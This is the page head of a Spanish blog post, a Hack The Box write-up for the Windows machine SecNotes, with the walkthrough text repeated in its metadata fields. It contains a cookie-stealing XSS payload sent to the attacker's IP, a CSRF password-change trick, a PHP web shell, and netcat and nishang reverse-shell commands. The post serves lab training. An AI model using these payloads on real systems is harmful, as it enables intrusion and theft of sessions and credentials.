<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>SecNotes - Hack The Box</title>

  <link rel="shortcut icon" href="/assets/favicon.ico">
  <link rel="icon" href="/assets/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/favicon.gif" type="image/gif">

  <link rel="stylesheet" href="/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>SecNotes - Hack The Box | Filthy Hacker</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="SecNotes - Hack The Box" />
<meta name="author" content="m4teo" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="En esta ocasión vamos a estar resolviendo la máquina SecNotes de Hack The Box. Es una máquina Windows de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma. Fase De Reconocimiento Primeramente vamos a lanzar una traza ICMP para saber si la máquina está activa. ping -c 1 10.10.10.97 Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del TTL; en este caso el valor del TTL de la máquina es 127, por lo que podemos intuir que estamos ante una máquina Windows. Recordemos que algunos de los valores referenciales son los siguientes: Sistema Operativo (OS) TTL Linux 64 Windows 128 Solaris 254 Si nos damos cuenta, en esta ocasión, el valor del TTL es 127 y no 128 como indica la tabla anterior, esto se debe a que en el entorno de máquinas de Hack The Box, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el TTL disminuye en una unidad. ping -c 1 10.10.10.97 -R Posteriormente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n 10.10.10.97 Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.97 A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos. nmap -sC -sV -p 80,445,8808 10.10.10.97 A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con HTTP, así como con SMB (Server Message Block). Empezando por el puerto 80 y 8808 podemos ver que ambas páginas están montadas sobre IIS (Internet Information Services), un servidor web para Microsft Windows. Echemos un vistazo desde WhatWeb, una herramienta que se encarga de identificar las tecnologías web que se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web. whatweb http://10.10.10.97 whatweb http://10.10.10.97:8808 No hay nada que llame especialmente nuestra atención, más que el redireccionamiento que realiza la primera página hacia lo que parece ser un panel de login, y el título de la segunda página web que es el que viene por defecto al montarla con IIS. En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador. Lo primero que nos puede venir a la mente al ver un panel de login, sería probar credenciales por defecto, sin embargo este no va a ser el caso. Algo interesante que voy a comentar solo como curiosidad, es que si ingresamos un nombre de usuario que no existe en el sistema, la página nos devolverá el siguiente mensaje. Algo que resulta crítico, ya que teniendo control sobre este mensaje, podemos aplicar fuerza bruta sobre el campo Username para descubrir usuarios válidos. Esto sería fácil de ejecutar teniendo a mano herramientas como Wfuzz y diccionarios como SecLists, que nos provee entre tantas cosas, un diccionario dedicado a nombres de usuario comunes. sudo apt install wfuzz git clone https://github.com/danielmiessler/SecLists wfuzz -c -L -t 400 --hs &quot;No account found with that username.&quot; -w /dirección/del/diccionario/SecLists/Usernames/Names/names.txt -d &quot;username=FUZZ&amp;password=noConocemosLaContraseña&quot; http://10.10.10.97 Parámetro Explicación -c Output colorizado -L Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero -t Específicamos el número de hilos con el queremos trabajar --hs Oculta las respuestas con la expresión regular que indiquemos, en este caso controlamos el mensaje de error -w Especificamos el diccionario con el que queremos trabajar -d Especificamos la petición por POST En caso de que aplicasemos fuerza bruta sobre este campo, descubriríamos que el usuario tyler existe dentro del sistema, por lo que ahora tendríamos que aplicar fuerza bruta sobre el campo Password, para lo cual ya no tendremos tanta suerte, ya que como veremos más adelante, su contraseña es bastante robusta, por lo que no es suceptible a ataques por diccionario. Respecto a la segunda página no hay prácticamente nada que podamos hacer, por el momento, al menos. Fase De Explotación La máquina SecNotes cuenta con dos vías potenciales para realizar la intrusión, una vía Inyecciones SQL y otra vía CSRF (Cross-Site Request Forgery). Cross-Site Request Forgery En vista de que las credenciales por defecto no funcionaron, podemos hacer lo que haría un usuario normal, registrarnos, no todo se trata de romper. Una vez hemos creado una cuenta, podemos logearnos, y veremos un panel bastante sencillo, pero donde destaca un nombre, tyler, un posible usuario potencial, que como mencioné antes, podíamos haberlo descubierto por fuerza bruta. Por otra parte, vemos que la página nos permite crear una serie de notas, hagámoslo. Vemos que el mecanismo de la página es bastante simple, pero si durante el desarrollo de la misma, no se tuvo en consideración ningún tipo de seguridad, quizá esta sea vulnerable a algo tan básico como confiar plenamente en el input del usuario. Intentemos ya algo no intencionado como una inyección HTML. En el campo Title podemos escribir cualquier cosa, aunque perfectamente podría ser la inyección, y en el campo Note, colocaremos lo siguiente: &lt;h1&gt;Una frase cualquiera&lt;/h1&gt; De este modo el texto que introduzcamos cambiará su formato al de header 1. O por ejemplo, podemos hacer que nuestro texto se desplace: &lt;marquee&gt;Una frase cualquiera&lt;/marquee&gt; Vemos que como atacantes, tenemos la capacidad de inyectar código al propio código fuente de la página web. ¿Qué tal si probamos ahora un XSS (Cross-Site Scripting)? Igual que antes, en el campo Title podemos escribir cualquier cosa, y en el campo Note, colocaremos lo siguiente: &lt;script&gt;alert(&quot;Una frase cualquiera&quot;)&lt;/script&gt; Podemos observar que cada vez que la página web se recarga, aparece un mensaje con el texto que indicamos anteriormente. ¿Qué tal si en vez de mostrar por pantalla una frase cualquiera, listamos mejor información relevante como la cookie de sesión? &lt;script&gt;alert(document.cookie)&lt;/script&gt; Una vez comprobamos que tenemos la capacidad de visualizar nuestra propia cookie de sesión a través de ventanas emergentes (pop-ups), podemos empezar a esbozar una posible vía potencial para la intrusión. Podemos intentar efectuar un Cookie Hijacking, ya que secuestrando la cookie de sesión de otro usuario, si este tiene su sesión abierta, podríamos ‘logearnos’ sin proporcionar credenciales, únicamente el valor de su cookie. Adicionalmente, tenemos que pensar en una forma de obtener el valor de la cookie directamente en nuestro equipo de atacantes, ya que de momento, estas ventanas solo son visibles por los usuarios cuando están en su panel de inicio, además de que llaman bastante la atención. Para ello, haremos uso de un Blind XSS. Empezaremos por crear un servidor con Python, en el cual recibiremos las cookies de los usuarios cada que estos refresquen, o se encuentren en su panel de inicio. sudo python3 -m http.server 80 A continuación, crearemos una nota con el siguiente mensaje: &lt;script&gt;document.write(&#39;&lt;img src=&quot;http://nuestraDirecciónIP:80/cookie=&#39; + document.cookie + &#39;&quot;&gt;&#39;)&lt;/script&gt; En vista de que recibimos nuestra propia cookie de sesión directamente en nuestro equipo, sería solo cuestión de tiempo para hacernos con las cookies de otros usuarios, si los existiera, claro está. Por obvias razones no existen más clientes que interactuen con el servidor web, a excepción de uno. Si recordamos, el mensaje inicial que aparecía en la página, mencionaba que nos pongamos en contacto con tyler a través del botón Contact Us; así que lo primero que haremos sera comprobar si este lee nuestros mensajes, para ello le enviaremos un url que apunte a nuestra máquina. Es importante mencionar que no podemos ocultar nuestro url con href, acortadores, iframe o algún otro método, ya que al ser un usuario simulado, este no lo gestiona muy bien. Por su parte, un usuario real, a no ser a que tenga nulos conocimientos de seguridad informática, abriría un enlace que le envía un total desconocido. Sin cerrar nuestro servidor hosteado con Python, a través del botón Contact Us, enviaremos el siguiente mensaje para confirmar si tyler lee nuestros mensajes: http://nuestraDirecciónIP:80/tylerEstáPresente Vemos que conseguimos una petición por GET por parte de la máquina víctima, por lo que asumimos que este lee nuestros mensajes. Ya con esto podemos pensar que tenemos una posible vía potencial para hacernos con la cookie del usuario. Por lo cual, enviaremos el siguiente mensaje: &lt;script&gt;document.write(&#39;&lt;img src=&quot;http://nuestraDirecciónIP:80/cookie=&#39; + document.cookie + &#39;&quot;&gt;&#39;)&lt;/script&gt; Para nuestra sorpresa, esto no funciona, así que tendremos que buscar otra alternativa. Investigando un poco más la página web, si decidimos cambiar nuestra contraseña, nos daremos cuenta que la página no nos solicita nuestra contraseña anterior, o algún otro método de verificación en dos pasos. Adicionalmente, si revisamos esta petición con Burp Suite, nos daremos cuenta que no existe algún tipo de CSRF Token, por lo que en principio, podríamos modificar esta petición a nuestro antojo. Lo que haremos será cambiar esta petición que se está tramitando por POST, a GET. De modo que no haya que proporcionar los campos Password y Confirm Password de forma manual, los proporcionaremos a través de la propia URL. Para ello, desde Burp Suite, habiendo capturado la petición del cambio de contraseña, simplemente haremos click derecho, Change request method, y copiaremos la nueva petición por GET. De esta manera, si añadimos http://10.10.10.97 al inicio de la petición que acabamos de copiar, generaremos un URL capaz de cambiar contraseñas a través del método GET; probémoslo. Posteriormente, proseguiremos a logearnos con la contraseña que establecimos en el URL. Ya una vez dentro, encontraremos una nota, con lo que parece ser un usuario y contraseña para un recurso compartido; si recordamos de nuestro escaneo con Nmap, el puerto 445 estaba abierto. SQL Injection Otro vector a considerar al encontrarnos frente a un panel de login sería probar Inyecciones SQL con las cuales bypassear el panel. Al igual que cuando aplicamos fuerza bruta sobre el campo Username, podemos ayudarnos de un diccionario como el mismo SecLists, el cual contiene una buena cantidad de expresiones que podemos probar. Habiendo bypasseado el panel de login llegaremos igualmente a las credenciales del recurso compartido a nivel de red, con la diferencia que tenemos acceso a las notas de todos los usuarios, no únicamente tyler. Independientemente de como nos hayamos hecho con las credenciales, podemos empezar a analizar el recurso con SMBMap. smbmap -H 10.10.10.97 -u &#39;tyler&#39; -p &#39;92g!mA8BGj0irkL%0G*&amp;&#39; Podemos observar que tenemos permiso de lectura y escritura sobre el recurso new-site, echemos un vistazo de manera recursiva sobre este. smbmap -H 10.10.10.97 -u &#39;tyler&#39; -p &#39;92g!mA8BGj0irkL%0G*&amp;&#39; -R &#39;new-site&#39; A partir de este punto empezaremos a trabajar con smbclient, ya que nos resultará mucho más cómoda su interfaz de línea de comandos (CLI). Para saber de que se trata el contenido dentro del recurso new-site podemos descargarlo en nuestra máquina con el comando get, aunque podemos también intuirlo en base al nombre de los archivos, IIS. get iisstart.htm get iisstart.png Rápidamente nos daremos cuenta que estamos frente al contenido de la segunda página web, alojada en el puerto 8808; por lo que, dada nuestra capacidad de escritura sobre el recurso, deberíamos de poder subir contenido que se vea reflejado en el servidor web. Empecemos por subir algo simple como una web shell. &lt;?php echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST[&#39;cmd&#39;]) . &quot;&lt;/pre&gt;&quot;; ?&gt; put cmd.php Una vez subida, desde nuestro navegador, podemos acceder a ella añadiendo /cmd.php?cmd=comando al url. Podemos ejecutar ipconfig para corroborar que nos encontramos dentro de la máquina víctima. O whoami para determinar que usuario somos. Ya a partir de este punto, lo que nos interesa como atacantes, es ganar acceso al sistema a través de una consola propiamente, para lo cual tenemos dos opciones: Podemos usar Netcat, para lo cual descargaremos la última versión, subiremos al servidor web la versión compilada para 64 bits. put nc64.exe Nos pondremos en escucha a través del puerto que determinemos. sudo rlwrap nc -nlvp &lt;puertoCualquiera&gt; Para finalmente a través del navegador añadir lo siguiente al url. /cmd.php?cmd=nc64.exe -e cmd &lt;nuestraDirecciónIP&gt; &lt;puertoCualquiera&gt; O por su parte podemos usar Invoke-PowerShellTcp de nishang, para lo cual descargaremos el script. wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 Añadimos lo siguiente al final del script. Invoke-PowerShellTcp -Reverse -IPAddress &lt;nuestraDirecciónIP&gt; -Port &lt;puertoCualquiera&gt; Lo subimos al servidor web. put Invoke-PowerShellTcp.ps1 Nos ponemos en escucha a través del puerto que determinamos anteriormente. sudo rlwrap nc -nlvp &lt;puertoCualquiera&gt; Para finalmente a través del navegador añadir lo siguiente al url. /cmd.php?cmd=powershell -ep bypass .\Invoke-PowerShellTcp Escalada De Privilegios" />
<meta property="og:description" content="En esta ocasión vamos a estar resolviendo la máquina SecNotes de Hack The Box. Es una máquina Windows de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma. Fase De Reconocimiento Primeramente vamos a lanzar una traza ICMP para saber si la máquina está activa. ping -c 1 10.10.10.97 Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del TTL; en este caso el valor del TTL de la máquina es 127, por lo que podemos intuir que estamos ante una máquina Windows. Recordemos que algunos de los valores referenciales son los siguientes: Sistema Operativo (OS) TTL Linux 64 Windows 128 Solaris 254 Si nos damos cuenta, en esta ocasión, el valor del TTL es 127 y no 128 como indica la tabla anterior, esto se debe a que en el entorno de máquinas de Hack The Box, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el TTL disminuye en una unidad. ping -c 1 10.10.10.97 -R Posteriormente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n 10.10.10.97 Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.97 A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos. nmap -sC -sV -p 80,445,8808 10.10.10.97 A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con HTTP, así como con SMB (Server Message Block). Empezando por el puerto 80 y 8808 podemos ver que ambas páginas están montadas sobre IIS (Internet Information Services), un servidor web para Microsft Windows. Echemos un vistazo desde WhatWeb, una herramienta que se encarga de identificar las tecnologías web que se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web. whatweb http://10.10.10.97 whatweb http://10.10.10.97:8808 No hay nada que llame especialmente nuestra atención, más que el redireccionamiento que realiza la primera página hacia lo que parece ser un panel de login, y el título de la segunda página web que es el que viene por defecto al montarla con IIS. En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador. Lo primero que nos puede venir a la mente al ver un panel de login, sería probar credenciales por defecto, sin embargo este no va a ser el caso. Algo interesante que voy a comentar solo como curiosidad, es que si ingresamos un nombre de usuario que no existe en el sistema, la página nos devolverá el siguiente mensaje. Algo que resulta crítico, ya que teniendo control sobre este mensaje, podemos aplicar fuerza bruta sobre el campo Username para descubrir usuarios válidos. Esto sería fácil de ejecutar teniendo a mano herramientas como Wfuzz y diccionarios como SecLists, que nos provee entre tantas cosas, un diccionario dedicado a nombres de usuario comunes. sudo apt install wfuzz git clone https://github.com/danielmiessler/SecLists wfuzz -c -L -t 400 --hs &quot;No account found with that username.&quot; -w /dirección/del/diccionario/SecLists/Usernames/Names/names.txt -d &quot;username=FUZZ&amp;password=noConocemosLaContraseña&quot; http://10.10.10.97 Parámetro Explicación -c Output colorizado -L Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero -t Específicamos el número de hilos con el queremos trabajar --hs Oculta las respuestas con la expresión regular que indiquemos, en este caso controlamos el mensaje de error -w Especificamos el diccionario con el que queremos trabajar -d Especificamos la petición por POST En caso de que aplicasemos fuerza bruta sobre este campo, descubriríamos que el usuario tyler existe dentro del sistema, por lo que ahora tendríamos que aplicar fuerza bruta sobre el campo Password, para lo cual ya no tendremos tanta suerte, ya que como veremos más adelante, su contraseña es bastante robusta, por lo que no es suceptible a ataques por diccionario. Respecto a la segunda página no hay prácticamente nada que podamos hacer, por el momento, al menos. Fase De Explotación La máquina SecNotes cuenta con dos vías potenciales para realizar la intrusión, una vía Inyecciones SQL y otra vía CSRF (Cross-Site Request Forgery). Cross-Site Request Forgery En vista de que las credenciales por defecto no funcionaron, podemos hacer lo que haría un usuario normal, registrarnos, no todo se trata de romper. Una vez hemos creado una cuenta, podemos logearnos, y veremos un panel bastante sencillo, pero donde destaca un nombre, tyler, un posible usuario potencial, que como mencioné antes, podíamos haberlo descubierto por fuerza bruta. Por otra parte, vemos que la página nos permite crear una serie de notas, hagámoslo. Vemos que el mecanismo de la página es bastante simple, pero si durante el desarrollo de la misma, no se tuvo en consideración ningún tipo de seguridad, quizá esta sea vulnerable a algo tan básico como confiar plenamente en el input del usuario. Intentemos ya algo no intencionado como una inyección HTML. En el campo Title podemos escribir cualquier cosa, aunque perfectamente podría ser la inyección, y en el campo Note, colocaremos lo siguiente: &lt;h1&gt;Una frase cualquiera&lt;/h1&gt; De este modo el texto que introduzcamos cambiará su formato al de header 1. O por ejemplo, podemos hacer que nuestro texto se desplace: &lt;marquee&gt;Una frase cualquiera&lt;/marquee&gt; Vemos que como atacantes, tenemos la capacidad de inyectar código al propio código fuente de la página web. ¿Qué tal si probamos ahora un XSS (Cross-Site Scripting)? Igual que antes, en el campo Title podemos escribir cualquier cosa, y en el campo Note, colocaremos lo siguiente: &lt;script&gt;alert(&quot;Una frase cualquiera&quot;)&lt;/script&gt; Podemos observar que cada vez que la página web se recarga, aparece un mensaje con el texto que indicamos anteriormente. ¿Qué tal si en vez de mostrar por pantalla una frase cualquiera, listamos mejor información relevante como la cookie de sesión? &lt;script&gt;alert(document.cookie)&lt;/script&gt; Una vez comprobamos que tenemos la capacidad de visualizar nuestra propia cookie de sesión a través de ventanas emergentes (pop-ups), podemos empezar a esbozar una posible vía potencial para la intrusión. Podemos intentar efectuar un Cookie Hijacking, ya que secuestrando la cookie de sesión de otro usuario, si este tiene su sesión abierta, podríamos ‘logearnos’ sin proporcionar credenciales, únicamente el valor de su cookie. Adicionalmente, tenemos que pensar en una forma de obtener el valor de la cookie directamente en nuestro equipo de atacantes, ya que de momento, estas ventanas solo son visibles por los usuarios cuando están en su panel de inicio, además de que llaman bastante la atención. Para ello, haremos uso de un Blind XSS. Empezaremos por crear un servidor con Python, en el cual recibiremos las cookies de los usuarios cada que estos refresquen, o se encuentren en su panel de inicio. sudo python3 -m http.server 80 A continuación, crearemos una nota con el siguiente mensaje: &lt;script&gt;document.write(&#39;&lt;img src=&quot;http://nuestraDirecciónIP:80/cookie=&#39; + document.cookie + &#39;&quot;&gt;&#39;)&lt;/script&gt; En vista de que recibimos nuestra propia cookie de sesión directamente en nuestro equipo, sería solo cuestión de tiempo para hacernos con las cookies de otros usuarios, si los existiera, claro está. Por obvias razones no existen más clientes que interactuen con el servidor web, a excepción de uno. Si recordamos, el mensaje inicial que aparecía en la página, mencionaba que nos pongamos en contacto con tyler a través del botón Contact Us; así que lo primero que haremos sera comprobar si este lee nuestros mensajes, para ello le enviaremos un url que apunte a nuestra máquina. Es importante mencionar que no podemos ocultar nuestro url con href, acortadores, iframe o algún otro método, ya que al ser un usuario simulado, este no lo gestiona muy bien. Por su parte, un usuario real, a no ser a que tenga nulos conocimientos de seguridad informática, abriría un enlace que le envía un total desconocido. Sin cerrar nuestro servidor hosteado con Python, a través del botón Contact Us, enviaremos el siguiente mensaje para confirmar si tyler lee nuestros mensajes: http://nuestraDirecciónIP:80/tylerEstáPresente Vemos que conseguimos una petición por GET por parte de la máquina víctima, por lo que asumimos que este lee nuestros mensajes. Ya con esto podemos pensar que tenemos una posible vía potencial para hacernos con la cookie del usuario. Por lo cual, enviaremos el siguiente mensaje: &lt;script&gt;document.write(&#39;&lt;img src=&quot;http://nuestraDirecciónIP:80/cookie=&#39; + document.cookie + &#39;&quot;&gt;&#39;)&lt;/script&gt; Para nuestra sorpresa, esto no funciona, así que tendremos que buscar otra alternativa. Investigando un poco más la página web, si decidimos cambiar nuestra contraseña, nos daremos cuenta que la página no nos solicita nuestra contraseña anterior, o algún otro método de verificación en dos pasos. Adicionalmente, si revisamos esta petición con Burp Suite, nos daremos cuenta que no existe algún tipo de CSRF Token, por lo que en principio, podríamos modificar esta petición a nuestro antojo. Lo que haremos será cambiar esta petición que se está tramitando por POST, a GET. De modo que no haya que proporcionar los campos Password y Confirm Password de forma manual, los proporcionaremos a través de la propia URL. Para ello, desde Burp Suite, habiendo capturado la petición del cambio de contraseña, simplemente haremos click derecho, Change request method, y copiaremos la nueva petición por GET. De esta manera, si añadimos http://10.10.10.97 al inicio de la petición que acabamos de copiar, generaremos un URL capaz de cambiar contraseñas a través del método GET; probémoslo. Posteriormente, proseguiremos a logearnos con la contraseña que establecimos en el URL. Ya una vez dentro, encontraremos una nota, con lo que parece ser un usuario y contraseña para un recurso compartido; si recordamos de nuestro escaneo con Nmap, el puerto 445 estaba abierto. SQL Injection Otro vector a considerar al encontrarnos frente a un panel de login sería probar Inyecciones SQL con las cuales bypassear el panel. Al igual que cuando aplicamos fuerza bruta sobre el campo Username, podemos ayudarnos de un diccionario como el mismo SecLists, el cual contiene una buena cantidad de expresiones que podemos probar. Habiendo bypasseado el panel de login llegaremos igualmente a las credenciales del recurso compartido a nivel de red, con la diferencia que tenemos acceso a las notas de todos los usuarios, no únicamente tyler. Independientemente de como nos hayamos hecho con las credenciales, podemos empezar a analizar el recurso con SMBMap. smbmap -H 10.10.10.97 -u &#39;tyler&#39; -p &#39;92g!mA8BGj0irkL%0G*&amp;&#39; Podemos observar que tenemos permiso de lectura y escritura sobre el recurso new-site, echemos un vistazo de manera recursiva sobre este. smbmap -H 10.10.10.97 -u &#39;tyler&#39; -p &#39;92g!mA8BGj0irkL%0G*&amp;&#39; -R &#39;new-site&#39; A partir de este punto empezaremos a trabajar con smbclient, ya que nos resultará mucho más cómoda su interfaz de línea de comandos (CLI). Para saber de que se trata el contenido dentro del recurso new-site podemos descargarlo en nuestra máquina con el comando get, aunque podemos también intuirlo en base al nombre de los archivos, IIS. get iisstart.htm get iisstart.png Rápidamente nos daremos cuenta que estamos frente al contenido de la segunda página web, alojada en el puerto 8808; por lo que, dada nuestra capacidad de escritura sobre el recurso, deberíamos de poder subir contenido que se vea reflejado en el servidor web. Empecemos por subir algo simple como una web shell. &lt;?php echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST[&#39;cmd&#39;]) . &quot;&lt;/pre&gt;&quot;; ?&gt; put cmd.php Una vez subida, desde nuestro navegador, podemos acceder a ella añadiendo /cmd.php?cmd=comando al url. Podemos ejecutar ipconfig para corroborar que nos encontramos dentro de la máquina víctima. O whoami para determinar que usuario somos. Ya a partir de este punto, lo que nos interesa como atacantes, es ganar acceso al sistema a través de una consola propiamente, para lo cual tenemos dos opciones: Podemos usar Netcat, para lo cual descargaremos la última versión, subiremos al servidor web la versión compilada para 64 bits. put nc64.exe Nos pondremos en escucha a través del puerto que determinemos. sudo rlwrap nc -nlvp &lt;puertoCualquiera&gt; Para finalmente a través del navegador añadir lo siguiente al url. /cmd.php?cmd=nc64.exe -e cmd &lt;nuestraDirecciónIP&gt; &lt;puertoCualquiera&gt; O por su parte podemos usar Invoke-PowerShellTcp de nishang, para lo cual descargaremos el script. wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 Añadimos lo siguiente al final del script. Invoke-PowerShellTcp -Reverse -IPAddress &lt;nuestraDirecciónIP&gt; -Port &lt;puertoCualquiera&gt; Lo subimos al servidor web. put Invoke-PowerShellTcp.ps1 Nos ponemos en escucha a través del puerto que determinamos anteriormente. sudo rlwrap nc -nlvp &lt;puertoCualquiera&gt; Para finalmente a través del navegador añadir lo siguiente al url. /cmd.php?cmd=powershell -ep bypass .\Invoke-PowerShellTcp Escalada De Privilegios" />
<link rel="canonical" href="http://localhost:8080/SecNotes-Hack-The-Box" />
<meta property="og:url" content="http://localhost:8080/SecNotes-Hack-The-Box" />
<meta property="og:site_name" content="Filthy Hacker" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-02-28T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="SecNotes - Hack The Box" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m4teo","url":"https://mateonitro550.github.io"},"dateModified":"2022-02-28T00:00:00-05:00","datePublished":"2022-02-28T00:00:00-05:00","description":"En esta ocasión vamos a estar resolviendo la máquina SecNotes de Hack The Box. Es una máquina Windows de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma. Fase De Reconocimiento Primeramente vamos a lanzar una traza ICMP para saber si la máquina está activa. ping -c 1 10.10.10.97 Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del TTL; en este caso el valor del TTL de la máquina es 127, por lo que podemos intuir que estamos ante una máquina Windows. Recordemos que algunos de los valores referenciales son los siguientes: Sistema Operativo (OS) TTL Linux 64 Windows 128 Solaris 254 Si nos damos cuenta, en esta ocasión, el valor del TTL es 127 y no 128 como indica la tabla anterior, esto se debe a que en el entorno de máquinas de Hack The Box, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el TTL disminuye en una unidad. ping -c 1 10.10.10.97 -R Posteriormente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n 10.10.10.97 Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.97 A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos. nmap -sC -sV -p 80,445,8808 10.10.10.97 A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con HTTP, así como con SMB (Server Message Block). Empezando por el puerto 80 y 8808 podemos ver que ambas páginas están montadas sobre IIS (Internet Information Services), un servidor web para Microsft Windows. Echemos un vistazo desde WhatWeb, una herramienta que se encarga de identificar las tecnologías web que se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web. whatweb http://10.10.10.97 whatweb http://10.10.10.97:8808 No hay nada que llame especialmente nuestra atención, más que el redireccionamiento que realiza la primera página hacia lo que parece ser un panel de login, y el título de la segunda página web que es el que viene por defecto al montarla con IIS. En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador. Lo primero que nos puede venir a la mente al ver un panel de login, sería probar credenciales por defecto, sin embargo este no va a ser el caso. Algo interesante que voy a comentar solo como curiosidad, es que si ingresamos un nombre de usuario que no existe en el sistema, la página nos devolverá el siguiente mensaje. Algo que resulta crítico, ya que teniendo control sobre este mensaje, podemos aplicar fuerza bruta sobre el campo Username para descubrir 